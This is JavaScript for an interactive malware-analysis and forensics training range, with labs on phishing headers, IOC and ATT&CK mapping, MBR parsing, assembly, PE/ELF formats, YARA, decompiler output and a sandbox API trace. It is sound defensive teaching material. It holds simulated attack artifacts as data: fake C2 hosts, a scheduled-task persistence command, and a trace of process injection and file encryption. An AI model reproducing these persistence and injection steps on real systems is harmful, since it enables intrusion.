function mailDecode(){const o=document.getElementById('m_pl');if(o){o.innerHTML='attachment "invoice.html" (base64) decoded:\n  <span class="hl">'+esc(atob(MAIL.attB64))+'</span>\n  → an HTML file that runs script the moment it is opened.';setObj('email','payload');}}
function mailCheck(){
 if(/fail/i.test(gv('m_spf')))setObj('email','spf'); else if(gv('m_spf'))toast('look at Received-SPF / DMARC');
 if(/paypa1/i.test(gv('m_dom')))setObj('email','spoof'); else if(gv('m_dom'))toast('compare the From domain to real paypal.com — note the digit 1');
 if(/paypa1-secure\.com/i.test(gv('m_url')))setObj('email','url'); else if(gv('m_url'))toast('the body link points where?');
}
function labEmail(){
 return `<div class="repane"><h5>raw headers</h5><table class="kv">${MAIL.headers.map(h=>`<tr><td style="color:var(--ash)">${h[0]}</td><td class="${h[2]?'tag-bad':''}">${h[1]}</td></tr>`).join('')}</table></div>
 <div class="pcode" style="margin-top:12px"><span class="cm">// body link</span>  ${esc(MAIL.url)}   <button class="btn" data-maildefang="1" style="padding:3px 9px;box-shadow:2px 2px 0 var(--volt)">defang</button></div>
 <div class="pktdetail" id="m_out" style="margin-top:8px">defang the URL before sharing it…</div>
 <div style="margin-top:12px"><button class="btn" data-maildecode="1">Decode attachment (base64)</button></div>
 <div class="pktdetail" id="m_pl" style="margin-top:8px">—</div>
 <div class="objbox" style="margin-top:18px"><h4>Submit findings</h4><div class="findform">
   <div><label>Auth result (spf/dmarc)</label><input id="m_spf" placeholder="pass/fail"></div>
   <div><label>Sender domain</label><input id="m_dom" placeholder="lookalike domain"></div>
   <div class="full"><label>Phishing URL</label><input id="m_url" placeholder="http://..."></div>
 </div><div style="margin-top:10px"><button class="btn" data-mailcheck="1">Check findings</button></div></div>
 <div class="hintbox"><b>The tells:</b> SPF/DKIM/DMARC all fail, the From domain is a homoglyph of <code>paypal.com</code> (digit <code>1</code> for letter <code>l</code>), Return-Path is an unrelated <code>.ru</code>, and the "invoice" attachment is active HTML. Any one is suspicious; together it's a phish.</div>`;
}

/* ---------------- THREAT INTEL / MITRE ---------------- */
const INTEL={
 narrative:'A finance user opened "invoice.xlsm" from an email. A macro spawned powershell.exe, which beaconed over HTTP to updates-cdn.xyz/gate.php every 60 seconds. Operators then encrypted file shares (.vault extension) and dropped a ransom note pointing to attacker@protonmail.com. Outbound traffic went to 45.133.1.88. The dropper md5 was 5f4dcc3b5aa765d61d8327deb882cf99.',
 iocs:[['updates-cdn.xyz','domain'],['45.133.1.88','ipv4'],['5f4dcc3b5aa765d61d8327deb882cf99','md5'],['attacker@protonmail.com','email']],
 ioctypes:['domain','ipv4','md5','email','mutex'],
 ttps:[['User opened a malicious xlsm attachment','T1566 Phishing'],['Macro launched powershell.exe','T1059 Command & Scripting Interpreter'],['HTTP beacon to C2 every 60s','T1071 Application Layer Protocol'],['File shares encrypted + ransom note','T1486 Data Encrypted for Impact']],
 ttpopts:['T1566 Phishing','T1059 Command & Scripting Interpreter','T1071 Application Layer Protocol','T1486 Data Encrypted for Impact','T1110 Brute Force'],
};
function intelIoc(){let ok=true;INTEL.iocs.forEach((x,i)=>{if(gv('i_ioc_'+i)!==x[1])ok=false;});if(ok)setObj('intel','iocs');else toast('check each IOC type — domain vs ipv4 vs md5 vs email');}
function intelTtp(){let ok=true;INTEL.ttps.forEach((x,i)=>{if(gv('i_ttp_'+i)!==x[1])ok=false;});if(ok)setObj('intel','attack');else toast('re-map the ATT&CK techniques to the behaviours');}
function labIntel(){
 return `<div class="pktdetail">${esc(INTEL.narrative)}</div>
 <h4 style="font-family:var(--mono);color:var(--volt);font-size:11px;letter-spacing:.2em;margin-top:18px">1 · CLASSIFY IOCs</h4>
 <table class="kv">${INTEL.iocs.map((x,i)=>`<tr><td style="word-break:break-all">${x[0]}</td><td><select id="i_ioc_${i}" class="lab-sel"><option value="">—</option>${INTEL.ioctypes.map(t=>`<option value="${t}">${t}</option>`).join('')}</select></td></tr>`).join('')}</table>
 <div style="margin-top:10px"><button class="btn" data-ioccheck="1">Check IOCs</button></div>
 <h4 style="font-family:var(--mono);color:var(--volt);font-size:11px;letter-spacing:.2em;margin-top:22px">2 · MAP TO ATT&CK</h4>
 <table class="kv">${INTEL.ttps.map((x,i)=>`<tr><td>${esc(x[0])}</td><td><select id="i_ttp_${i}" class="lab-sel"><option value="">—</option>${INTEL.ttpopts.map(t=>`<option value="${esc(t)}">${esc(t)}</option>`).join('')}</select></td></tr>`).join('')}</table>
 <div style="margin-top:10px"><button class="btn" data-ttpcheck="1">Check mapping</button></div>
 <div class="hintbox"><b>Why this is the daily job:</b> turning a messy report into structured IOCs (for blocking/hunting) and ATT&CK techniques (for detection coverage) is most of what a CTI/SOC analyst actually produces.</div>`;
}

/* ---------------- init hooks + events ---------------- */
const LABINIT={
 log: logPaint,
 mem: ()=>{const e=document.getElementById('memcmd');if(e)e.focus();},
 pwn: pwnRender,
 privesc: ()=>{ if(!LAB.privOut.length)LAB.privOut=privBanner(); privPaint(); const e=document.getElementById('privcmd');if(e)e.focus(); },
};
document.addEventListener('click',e=>{
 const t=e.target,c=s=>t.closest(s);let el;
 if(el=c('[data-cyload]')){cyLoad(el.dataset.cyload);return;}
 if(el=c('[data-cyop]')){cyOp(el.dataset.cyop);return;}
 if(el=c('[data-webtab]')){LAB.webTab=el.dataset.webtab;render();return;}
 if(el=c('[data-webact]')){({sqli:webSQL,lfi:webLFI,cmdi:webCMD,xss:webXSS}[el.dataset.webact]||function(){})();return;}
 if(el=c('[data-petab]')){LAB.peTab=el.dataset.petab;render();return;}
 if(el=c('[data-peunpack]')){LAB.peUnpacked=!LAB.peUnpacked;render();return;}
 if(el=c('[data-pecheck]')){peCheck();return;}
 if(el=c('[data-peyara]')){peYara();return;}
 if(el=c('[data-steg]')){stegAct(el.dataset.steg);return;}
 if(el=c('[data-pwncalc]')){pwnRender();return;}
 if(el=c('[data-pwncan]')){el.dataset.pwncan==='1'?(setObj('pwn','canary'),toast('correct — the canary check aborts before ret')):toast('not quite — re-read the options');return;}
 if(el=c('[data-privq]')){privRun(el.dataset.privq);const i=document.getElementById('privcmd');if(i){i.value='';updateGhostText(i);i.focus();}return;}
 if(el=c('[data-hashid]')){hashIdCheck();return;}
 if(el=c('[data-hashcrack]')){hashCrack();return;}
 if(el=c('[data-hashsalt]')){hashSalt();return;}
 if(el=c('[data-maildefang]')){mailDefang();return;}
 if(el=c('[data-maildecode]')){mailDecode();return;}
 if(el=c('[data-mailcheck]')){mailCheck();return;}
 if(el=c('[data-ioccheck]')){intelIoc();return;}
 if(el=c('[data-ttpcheck]')){intelTtp();return;}
});
document.addEventListener('keydown',e=>{ if(e.key!=='Enter')return;
 if(e.target.id==='privcmd'){const v=e.target.value;e.target.value='';privRun(v);e.target.focus();e.preventDefault();}
});
document.addEventListener('input',e=>{ if(e.target.id==='pw_fill'||e.target.id==='pw_tgt')pwnRender(); });
document.addEventListener('change',e=>{ if(e.target.id==='pw_tgt')pwnRender(); });

/* ============================================================ RANGE — CHAPTER LABS (one per Map phase 1–12) ============================================================ */
LAB.disk=null; LAB.asmReg=null; LAB.asmPc=0; LAB.binTab='elf'; LAB.dynFilter=''; LAB.unpPc=0; LAB.unpPatched=false;
LAB.mfOut=[]; LAB.netJa3=false; LAB.rkTab='reg'; LAB.protoKey=''; LAB.capStage=0; LAB.ghTab='code';

LABS.push(
 {id:'disk',    track:'DF',  group:'chapter',phase:1, name:'Disk & File Systems', tool:'MBR · partitions · carving',     blurb:'Parse a raw 512-byte boot sector by hand: partition table, FS type, start LBA, the 55AA signature — then carve a file by magic bytes.'},
 {id:'asm',     track:'RE',  group:'chapter',phase:2, name:'x86 / x64 Assembly',  tool:'register tracer',               blurb:'Single-step a short x64 routine, watch the registers change, and work out what it returns — plus the calling convention.'},
 {id:'binfmt',  track:'RE',  group:'chapter',phase:3, name:'PE & ELF Formats',    tool:'header anatomy',                blurb:'Decode ELF and PE headers field by field: magic, class, entry point, sections vs segments, GOT/PLT.'},
 {id:'static',  track:'MA',  group:'chapter',phase:4, name:'Static Analysis',     tool:'strings · hash · YARA',         blurb:'Run the static triage loop: strings → FLOSS, hash → VT, entropy → packing, then write a YARA rule that fires only on this sample.'},
 {id:'ghidra',  track:'RE',  group:'chapter',phase:5, name:'Ghidra & Decompiler', tool:'pseudo-C · structs · xrefs',    blurb:'Read decompiler output: deduce what a function does, recover a struct from offset accesses, and follow a cross-reference.'},
 {id:'dynamic', track:'MA',  group:'chapter',phase:6, name:'Dynamic Analysis',    tool:'API / behavior trace',         blurb:'Detonate a sample and read the behavioral trace — spot persistence, process injection, C2 and the encryption payload.'},
 {id:'unpack',  track:'MA',  group:'chapter',phase:7, name:'Unpacking & Patching', tool:'OEP · IAT · NOP patch',        blurb:'Step a packer stub to the tail jump, find the OEP, dump, reason about the IAT, and NOP a check.'},
 {id:'memory',  track:'DF',  group:'chapter',phase:8, name:'Memory Forensics',    tool:'EPROCESS · VAD · shellcode',    blurb:'Catch a DKOM-unlinked process by diffing pslist vs psscan, find its RWX VAD, and disassemble the injected shellcode.'},
 {id:'network', track:'DF',  group:'chapter',phase:9, name:'Network Forensics',   tool:'beaconing · JA3 · carving',    blurb:'Find the C2 in a flow table by its beacon periodicity, match a malicious JA3, and carve a transferred executable.'},
 {id:'protocol',track:'RE',  group:'chapter',phase:10,name:'Protocol RE & C2',    tool:'binary protocol parsing',      blurb:'Reverse a custom C2 protocol from a raw byte stream: find the magic, the framing, the XOR key, and decode the commands.'},
 {id:'rootkit', track:'MA',  group:'chapter',phase:11,name:'Rootkits & Artifacts', tool:'registry · MFT · evtx · hooks', blurb:'Hunt persistence in a Run key, catch timestomping via $SI/$FN mismatch, find a 7045 service install, and spot an SSDT hook.'},
 {id:'capstone',track:'DF',  group:'chapter',phase:12,name:'Full Investigation',  tool:'end-to-end reconstruction',    blurb:'Chain it all: phishing → execution → C2 → impact. Make the call at each stage to reconstruct the whole intrusion.'},
);
Object.assign(LABOBJ,{
 disk:[{k:'sig',t:'Find the boot signature'},{k:'fstype',t:'Identify partition 1 file system'},{k:'lba',t:'Read partition 1 start LBA'},{k:'carve',t:'Identify the carved file by its magic'}],
 asm:[{k:'ret',t:'Compute what the routine returns'},{k:'argreg',t:'Name the 1st integer-argument register'},{k:'retreg',t:'Name the return-value register'}],
 binfmt:[{k:'magic',t:'Identify the format from its magic'},{k:'entry',t:'Read the entry point'},{k:'loader',t:'Which does the OS loader use — sections or segments?'},{k:'packed',t:'Which section flags packing?'}],
 static:[{k:'packed',t:'Detect packing from entropy'},{k:'c2',t:'Recover the C2 (FLOSS)'},{k:'hash',t:'Hash & check reputation'},{k:'yara',t:'Write a clean YARA rule'}],
 ghidra:[{k:'logic',t:'Deduce what the function does'},{k:'struct',t:'Recover the struct layout'},{k:'xref',t:'Follow the cross-reference'}],
 dynamic:[{k:'persist',t:'Identify the persistence mechanism'},{k:'inject',t:'Identify the injection technique'},{k:'c2',t:'Identify the C2 endpoint'},{k:'impact',t:'Identify the impact / payload'}],
 unpack:[{k:'oep',t:'Find the Original Entry Point'},{k:'dump',t:'Dump the image at OEP'},{k:'iat',t:'Why rebuild the IAT?'},{k:'patch',t:'NOP-patch the check'}],
 memory:[{k:'hidden',t:'Find the DKOM-hidden process'},{k:'rwx',t:'Find its RWX VAD'},{k:'shellcode',t:'Disassemble the injected shellcode'}],
 network:[{k:'beacon',t:'Identify the beaconing C2 host'},{k:'interval',t:'Measure the beacon interval'},{k:'ja3',t:'Match the malicious JA3'},{k:'file',t:'Carve the transferred file'}],
 protocol:[{k:'magic',t:'Find the frame magic bytes'},{k:'frames',t:'Count the frames'},{k:'key',t:'Recover the XOR key'},{k:'cmd',t:'Decode an operator command'}],
 rootkit:[{k:'persist',t:'Find the persistence Run key'},{k:'timestomp',t:'Detect the timestomped file'},{k:'service',t:'Find the malicious service (7045)'},{k:'hook',t:'Identify the SSDT hook'}],
 capstone:[{k:'access',t:'Initial access'},{k:'exec',t:'Execution'},{k:'c2',t:'Command & control'},{k:'impact',t:'Impact'}],
});

/* ---- 1 · DISK ---- */
function diskBytes(){
 if(LAB.disk)return LAB.disk;
 const b=new Array(512).fill(0);
 for(let i=0;i<0x20;i++)b[i]=[0xEB,0x63,0x90][i%3];
 [0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A].forEach((v,i)=>b[0x20+i]=v);
 const e1=0x1BE; b[e1]=0x80; b[e1+4]=0x07; b[e1+8]=0x00;b[e1+9]=0x08; b[e1+12]=0x00;b[e1+13]=0x20;b[e1+14]=0x03;
 const e2=0x1CE; b[e2+4]=0x83; b[e2+8]=0x00;b[e2+9]=0x28;b[e2+10]=0x03;
 b[0x1FE]=0x55; b[0x1FF]=0xAA;
 LAB.disk=b; return b;
}
function le32(b,o){return (b[o]|(b[o+1]<<8)|(b[o+2]<<16)|(b[o+3]<<24))>>>0;}
const PTYPE={0x07:'NTFS / exFAT',0x83:'Linux',0x0b:'FAT32',0xee:'GPT protective',0x82:'Linux swap'};
function diskParse(){const b=diskBytes(),out=document.getElementById('disk_out');if(!out)return;let s='Partition table @ 0x1BE (4 × 16 bytes):\n';
 [0x1BE,0x1CE,0x1DE,0x1EE].forEach((o,i)=>{const boot=b[o],type=b[o+4],lba=le32(b,o+8),sec=le32(b,o+12);if(type===0){s+='  #'+(i+1)+': (empty)\n';return;}s+='  #'+(i+1)+': '+(boot===0x80?'[bootable] ':'           ')+'type=0x'+type.toString(16).padStart(2,'0')+' ('+(PTYPE[type]||'?')+')  startLBA='+lba+'  sectors='+sec+'\n';});
 s+='\nBoot signature @ 0x1FE: '+b[0x1FE].toString(16).toUpperCase()+b[0x1FF].toString(16).toUpperCase();out.textContent=s;}
function diskCarve(){const b=diskBytes(),out=document.getElementById('disk_out');if(!out)return;const sig=b.slice(0x20,0x28).map(x=>x.toString(16).padStart(2,'0')).join(' ');out.textContent='magic bytes @ 0x20:  '+sig+'\n→ 89 50 4E 47 0D 0A 1A 0A  =  \\x89PNG  →  PNG image';}
function diskCheck(){
 if(/55\s*aa/i.test(gv('d_sig').replace(/0x/ig,'')))setObj('disk','sig'); else if(gv('d_sig'))toast('the last 2 bytes of the 512-byte sector');
 if(/ntfs/i.test(gv('d_fs')))setObj('disk','fstype'); else if(gv('d_fs'))toast('type byte 0x07 maps to which FS?');
 if(gv('d_lba').trim()==='2048')setObj('disk','lba'); else if(gv('d_lba'))toast('partition #1 startLBA from the table');
 if(/png/i.test(gv('d_carve')))setObj('disk','carve'); else if(gv('d_carve'))toast('decode the magic 89 50 4E 47');
}
function labDisk(){const b=diskBytes();let rows='';for(let o=0;o<512;o+=16){let hex='',asc='';for(let i=0;i<16;i++){const v=b[o+i];hex+=v.toString(16).padStart(2,'0')+' ';asc+=(v>=32&&v<127)?String.fromCharCode(v):'.';}const hot=(o>=0x1B0&&o<0x200)||(o>=0x20&&o<0x30);rows+='<div class="row"><span class="a">'+o.toString(16).padStart(4,'0')+'</span><span class="'+(hot?'mn':'by')+'">'+hex+'</span><span class="cm">'+esc(asc)+'</span></div>';}
 return `<p class="lede" style="margin-top:0">Raw hex of a 512-byte MBR. The highlighted regions are the partition table (0x1BE) and a carved file header (0x20).</p>
 <div class="repane"><h5>sector hexdump (512 bytes)</h5><div class="asm" style="max-height:300px">${rows}</div></div>
 <div class="qchips" style="margin-top:12px"><button data-diskact="parse">parse partition table</button><button data-diskact="carve">carve file @ 0x20</button></div>
 <div class="pktdetail" id="disk_out" style="margin-top:12px">parse the table or carve the file…</div>
 <div class="objbox" style="margin-top:18px"><h4>Submit findings</h4><div class="findform">
  <div><label>Boot signature (hex)</label><input id="d_sig" placeholder="last 2 bytes"></div>
  <div><label>Partition 1 file system</label><input id="d_fs" placeholder="type 0x07 → ?"></div>
  <div><label>Partition 1 start LBA</label><input id="d_lba" placeholder="number"></div>
  <div><label>Carved file type</label><input id="d_carve" placeholder="from the magic"></div>
 </div><div style="margin-top:10px"><button class="btn" data-diskcheck="1">Check findings</button></div></div>
 <div class="hintbox"><b>Reading the table:</b> each 16-byte entry is [bootflag][CHS×3][type][CHS×3][LBA start ×4 LE][sectors ×4 LE]. The two bytes at 0x1FE must be <code>55 AA</code> or the BIOS won't boot it.</div>`;
}

/* ---- 2 · ASM ---- */
const ASM=[{t:'mov rax, 5',f:r=>r.rax=5},{t:'mov rbx, 3',f:r=>r.rbx=3},{t:'add rax, rbx',f:r=>r.rax+=r.rbx},{t:'imul rax, rax',f:r=>r.rax*=r.rax},{t:'sub rax, 4',f:r=>r.rax-=4},{t:'mov rdi, rax',f:r=>r.rdi=r.rax},{t:'ret  ; returns rax',f:r=>{}}];
function asmReset(){LAB.asmReg={rax:0,rbx:0,rcx:0,rdi:0};LAB.asmPc=0;}
function asmPaint(){const r=LAB.asmReg||{rax:0,rbx:0,rcx:0,rdi:0};const code=document.getElementById('asm_code');if(code)code.innerHTML=ASM.map((ins,i)=>'<div class="row" style="'+(i===LAB.asmPc?'background:rgba(45,226,230,.14)':'')+'"><span class="a">'+(i===LAB.asmPc?'▶':' ')+'</span><span class="mn">'+esc(ins.t)+'</span></div>').join('');const reg=document.getElementById('asm_reg');if(reg)reg.innerHTML=Object.keys(r).map(k=>'<div class="srow"><span>'+k+'</span><b>'+r[k]+' <span style="color:var(--ash)">0x'+(r[k]>>>0).toString(16)+'</span></b></div>').join('');}
function asmStep(){if(!LAB.asmReg)asmReset();if(LAB.asmPc<ASM.length){ASM[LAB.asmPc].f(LAB.asmReg);LAB.asmPc++;}asmPaint();}
function asmRunAll(){asmReset();ASM.forEach(i=>i.f(LAB.asmReg));LAB.asmPc=ASM.length;asmPaint();}
function asmCheck(){if(gv('asm_ret').trim()==='60')setObj('asm','ret');else if(gv('asm_ret'))toast('run to the end and read rax (5+3=8, ²=64, −4)');}
function labAsm(){if(!LAB.asmReg)asmReset();
 return `<p class="lede" style="margin-top:0">Single-step the routine and watch the registers. What is in <code>rax</code> when it returns?</p>
 <div class="rebench">
  <div class="repane"><h5>&lt;compute&gt;</h5><div class="asm" id="asm_code"></div></div>
  <div class="repane"><h5>registers</h5><div class="stack" id="asm_reg"></div></div>
 </div>
 <div class="qchips" style="margin-top:12px"><button data-asmstep="1">Step ▸</button><button data-asmrun="1">Run to end ⏭</button><button data-asmreset="1">Reset ↺</button>
  <input id="asm_ret" class="lab-sel" style="width:100px" placeholder="returns?"> <button class="btn" data-asmcheck="1" style="padding:6px 12px">Check</button></div>
 <div class="objbox" style="margin-top:18px"><h4>Calling convention (System V x64)</h4>
  <p style="color:var(--ash);font-size:14px;margin:0 0 8px">1st integer argument is passed in…</p>
  <button class="opt" data-mcq="asm|argreg|0"><b>A</b>rax</button><button class="opt" data-mcq="asm|argreg|1"><b>B</b>rdi</button><button class="opt" data-mcq="asm|argreg|0"><b>C</b>rsp</button>
  <p style="color:var(--ash);font-size:14px;margin:12px 0 8px">The return value comes back in…</p>
  <button class="opt" data-mcq="asm|retreg|1"><b>A</b>rax</button><button class="opt" data-mcq="asm|retreg|0"><b>B</b>rbx</button><button class="opt" data-mcq="asm|retreg|0"><b>C</b>rdi</button>
 </div>
 <div class="hintbox"><b>Convention:</b> System V (Linux) passes integer args in rdi, rsi, rdx, rcx, r8, r9 and returns in rax. Windows x64 uses rcx, rdx, r8, r9.</div>`;
}

/* ---- 3 · BINFMT ---- */
function labBinfmt(){const tab=LAB.binTab;
 const elf=`<div class="asm"><div class="row"><span class="a">0x00</span><span class="mn">7F 45 4C 46</span><span class="cm">  e_ident: magic = \\x7fELF</span></div>
<div class="row"><span class="a">0x04</span><span class="mn">02</span><span class="cm">  EI_CLASS = 2 → 64-bit</span></div>
<div class="row"><span class="a">0x05</span><span class="mn">01</span><span class="cm">  EI_DATA = 1 → little-endian</span></div>
<div class="row"><span class="a">0x10</span><span class="mn">03 00</span><span class="cm">  e_type = ET_DYN (PIE / shared obj)</span></div>
<div class="row"><span class="a">0x12</span><span class="mn">3E 00</span><span class="cm">  e_machine = 0x3E → x86-64</span></div>
<div class="row"><span class="a">0x18</span><span class="mn">60 10 00 00 ...</span><span class="cm">  e_entry = 0x1060</span></div></div>`;
 const pe=`<div class="asm"><div class="row"><span class="a">0x00</span><span class="mn">4D 5A</span><span class="cm">  DOS magic = "MZ"</span></div>
<div class="row"><span class="a">0x3C</span><span class="mn">80 00 00 00</span><span class="cm">  e_lfanew → PE header @ 0x80</span></div>
<div class="row"><span class="a">0x80</span><span class="mn">50 45 00 00</span><span class="cm">  "PE\\0\\0" signature</span></div>
<div class="row"><span class="a">0x84</span><span class="mn">64 86</span><span class="cm">  Machine = 0x8664 → x86-64</span></div>
<div class="row"><span class="a">0xA8</span><span class="mn">00 15 00 00</span><span class="cm">  AddressOfEntryPoint = 0x1500 (RVA)</span></div></div>`;
 return `<div class="logtabs"><button data-bintab="elf" aria-current="${tab==='elf'}">ELF header</button><button data-bintab="pe" aria-current="${tab==='pe'}">PE header</button></div>
 <div class="repane"><h5>${tab==='elf'?'ELF64 header bytes':'PE / MZ header bytes'}</h5>${tab==='elf'?elf:pe}</div>
 <div class="objbox" style="margin-top:14px"><h4>Submit findings</h4><div class="findform">
  <div><label>Format magic (this tab)</label><input id="b_magic" placeholder="ELF or MZ/PE"></div>
  <div><label>Entry point (this tab)</label><input id="b_entry" placeholder="0x...."></div>
 </div><div style="margin-top:10px"><button class="btn" data-bincheck="1">Check</button></div></div>
 <div class="objbox" style="margin-top:14px"><h4>Concepts</h4>
  <p style="color:var(--ash);font-size:14px;margin:0 0 8px">To map a binary into memory, the OS loader reads…</p>
  <button class="opt" data-mcq="binfmt|loader|0"><b>A</b>section headers</button><button class="opt" data-mcq="binfmt|loader|1"><b>B</b>program headers / segments</button><button class="opt" data-mcq="binfmt|loader|0"><b>C</b>the symbol table</button>
  <p style="color:var(--ash);font-size:14px;margin:12px 0 8px">A section with entropy ≈ 7.9 and an odd name like UPX1 signals…</p>
  <button class="opt" data-mcq="binfmt|packed|1"><b>A</b>compression/encryption → packed</button><button class="opt" data-mcq="binfmt|packed|0"><b>B</b>a debug build</button><button class="opt" data-mcq="binfmt|packed|0"><b>C</b>a driver</button>
 </div>
 <div class="hintbox"><b>Key split:</b> the linker/analysis tools use <i>sections</i> (.text/.data); the OS loader maps <i>segments</i> (program headers, PT_LOAD). GOT/PLT: the PLT is a per-import stub, the GOT is the table the loader fills with resolved addresses.</div>`;
}
function binCheck(){const tab=LAB.binTab;const mg=gv('b_magic').toLowerCase(),en=gv('b_entry').toLowerCase().replace(/\s/g,'');
 if((tab==='elf'&&/elf|7f45/.test(mg))||(tab==='pe'&&/(mz|pe|4d5a)/.test(mg)))setObj('binfmt','magic');else if(mg)toast('read the first bytes of this tab');
 if((tab==='elf'&&/0x?1060/.test(en))||(tab==='pe'&&/0x?1500/.test(en)))setObj('binfmt','entry');else if(en)toast('e_entry (ELF) / AddressOfEntryPoint (PE)');}

/* ---- 4 · STATIC ---- */
function staticAct(w){const out=document.getElementById('st_out');if(!out)return;
 if(w==='strings')out.innerHTML='$ strings sample.bin | head\n  !This program cannot be run in DOS mode\n  UPX0\n  UPX1\n  <span class="dim">...mostly non-printable. Almost no readable strings → suspect packing; escalate to FLOSS.</span>';
 else if(w==='floss')out.innerHTML='$ floss sample.bin   (decodes stack/obfuscated strings)\n  <span class="hl">http://cdn-telemetry.xyz/p.bin</span>\n  Global\\BV-MTX\n  schtasks /create /tn Updater /sc minute\n  <span class="dim">FLOSS recovered the strings the packer hid.</span>';
 else if(w==='sha256'){out.innerHTML='$ sha256sum sample.bin\n  9f2c...e41a  sample.bin\n  VirusTotal: <span class="hl">51 / 72 engines detect (Trojan.Win32.Injector)</span>';setObj('static','hash');}
 else if(w==='entropy'){out.innerHTML='$ section entropy\n  .text  6.40\n  .rdata 5.10\n  <span class="hl">UPX1  7.92  ← near-8.0 = compressed/encrypted → PACKED</span>';setObj('static','packed');}
}
function staticYara(){const sel=[].slice.call(document.querySelectorAll('[data-syara]')).filter(x=>x.checked).map(x=>x.value);const out=document.getElementById('st_yres');if(!out)return;
 const uniq=sel.some(s=>/cdn-telemetry|BV-MTX|Updater/.test(s)),gen=sel.some(s=>/DOS mode|UPX/.test(s));
 if(!sel.length){out.textContent='select at least one string.';return;}
 if(gen){out.innerHTML='<span class="err">matches countless files — "DOS mode"/"UPX" are everywhere. Pick unique strings.</span>';}
 else if(uniq){out.innerHTML='<span class="hl">matches this sample, ~0 false positives. Good — keyed on the C2 / mutex.</span>';setObj('static','yara');}
 else out.textContent='valid but weak — prefer the unique artifacts.';}
function staticCheck(){if(gv('st_c2').toLowerCase().includes('cdn-telemetry'))setObj('static','c2');else if(gv('st_c2'))toast('FLOSS revealed an http URL');}
function labStatic(){const cands=['!This program cannot be run in DOS mode','UPX1','http://cdn-telemetry.xyz/p.bin','Global\\BV-MTX','schtasks /create /tn Updater'];
 return `<p class="lede" style="margin-top:0">The static triage loop — never run the sample. Each tool answers (or redirects) a question.</p>
 <div class="qchips"><button data-statact="strings">strings</button><button data-statact="floss">floss</button><button data-statact="sha256">sha256 + VT</button><button data-statact="entropy">entropy</button></div>
 <div class="pktdetail" id="st_out" style="margin-top:12px">run a tool…</div>
 <div class="objbox" style="margin-top:16px"><h4>YARA rule — pick the match strings</h4>
  <div class="pktdetail">${cands.map(s=>'<label style="display:block;cursor:pointer"><input type="checkbox" data-syara value="'+esc(s)+'"> '+esc(s)+'</label>').join('')}</div>
  <div style="margin-top:10px"><button class="btn" data-statyara="1">Test rule</button></div><div class="pktdetail" id="st_yres" style="margin-top:8px">—</div></div>
 <div class="objbox" style="margin-top:14px"><h4>Submit findings</h4><div class="findform"><div class="full"><label>C2 URL / host</label><input id="st_c2" placeholder="from FLOSS"></div></div><div style="margin-top:10px"><button class="btn" data-statcheck="1">Check</button></div></div>
 <div class="hintbox"><b>The loop:</b> empty <code>strings</code> → escalate to <code>floss</code>; high section entropy → packed; hash → reputation (VT); then turn the unique artifacts into a YARA rule for hunting.</div>`;
}

/* ---- 5 · GHIDRA ---- */
function labGhidra(){
 return `<p class="lede" style="margin-top:0">Decompiler output rarely has names. Read past the noise.</p>
 <div class="repane"><h5>decompiler — FUN_00401500</h5><div class="pcode"><span class="kw">int</span> FUN_00401500(<span class="kw">char</span> *param_1) {
  <span class="kw">int</span> local_c = 0;
  <span class="kw">while</span> (param_1[local_c] != 0) {
    param_1[local_c] = param_1[local_c] ^ 0x2a;
    local_c = local_c + 1;
  }
  <span class="kw">return</span> local_c;
}</div></div>
 <div class="objbox" style="margin-top:14px"><h4>What does FUN_00401500 do?</h4>
  <button class="opt" data-mcq="ghidra|logic|0"><b>A</b>Computes a CRC32</button>
  <button class="opt" data-mcq="ghidra|logic|1"><b>B</b>XOR-decrypts a string in place with key 0x2a and returns its length</button>
  <button class="opt" data-mcq="ghidra|logic|0"><b>C</b>Compares two strings</button>
 </div>
 <div class="objbox" style="margin-top:14px"><h4>Recover the struct from these accesses</h4>
  <div class="pcode" style="margin-bottom:8px"><span class="cm">// *(int *)(p + 0x0)   *(char **)(p + 0x8)   *(int *)(p + 0x10)</span></div>
  <button class="opt" data-mcq="ghidra|struct|0"><b>A</b>{ int a; int b; int c; }  // 12 bytes</button>
  <button class="opt" data-mcq="ghidra|struct|1"><b>B</b>{ int id; char *name; int flags; }  // 0x18 bytes (8-byte aligned pointer)</button>
  <button class="opt" data-mcq="ghidra|struct|0"><b>C</b>{ char buf[16]; }</button>
 </div>
 <div class="objbox" style="margin-top:14px"><h4>Xrefs to FUN_00401500</h4>
  <div class="pcode" style="margin-bottom:8px">main → calls decode_config → calls FUN_00401500 ; (only path)</div>
  <button class="opt" data-mcq="ghidra|xref|1"><b>A</b>decode_config</button>
  <button class="opt" data-mcq="ghidra|xref|0"><b>B</b>WinMain</button>
  <button class="opt" data-mcq="ghidra|xref|0"><b>C</b>nothing references it</button>
 </div>
 <div class="hintbox"><b>Reading decompiler output:</b> name functions by what they do (this one → <code>xor_decrypt</code>), recover structs from the <i>offsets and access widths</i> (a pointer forces 8-byte alignment), and use xrefs to learn who relies on a routine before you change it.</div>`;
}

/* ---- 6 · DYNAMIC ---- */
const DYN=['08:00:01  CreateFileW("C:\\\\Users\\\\v\\\\AppData\\\\Local\\\\Temp\\\\svc.exe", GENERIC_WRITE)',
 '08:00:01  WriteFile(svc.exe, 86016 bytes)',
 '08:00:02  RegSetValueExW(HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater = svc.exe)',
 '08:00:03  OpenProcess(PROCESS_ALL_ACCESS, pid=812 explorer.exe)',
 '08:00:03  VirtualAllocEx(pid=812, 0x4000, RWX)',
 '08:00:03  WriteProcessMemory(pid=812, shellcode)',
 '08:00:03  CreateRemoteThread(pid=812, start=0x...)',
 '08:00:05  DnsQuery_A("cdn-telemetry.xyz")',
 '08:00:05  connect(185.220.101.47:443)',
 '08:00:12  CryptEncrypt(loop over C:\\\\Users\\\\v\\\\Documents\\\\*.docx)',
 '08:00:40  CreateFileW("READ_ME.vault.txt", GENERIC_WRITE)'];
function dynPaint(){const b=document.getElementById('dyn_body');if(!b)return;const f=LAB.dynFilter.toLowerCase();b.innerHTML=DYN.filter(l=>!f||l.toLowerCase().includes(f)).map(l=>{const bad=/Run\\|RegSetValue|VirtualAllocEx|WriteProcessMemory|CreateRemoteThread|connect|CryptEncrypt/.test(l);return (bad?'<span class="hit">':'')+esc(l)+(bad?'</span>':'');}).join('\n');}
function dynCheck(){
 if(/run|registry|reg key/i.test(gv('dy_p')))setObj('dynamic','persist');else if(gv('dy_p'))toast('which API writes an autostart entry?');
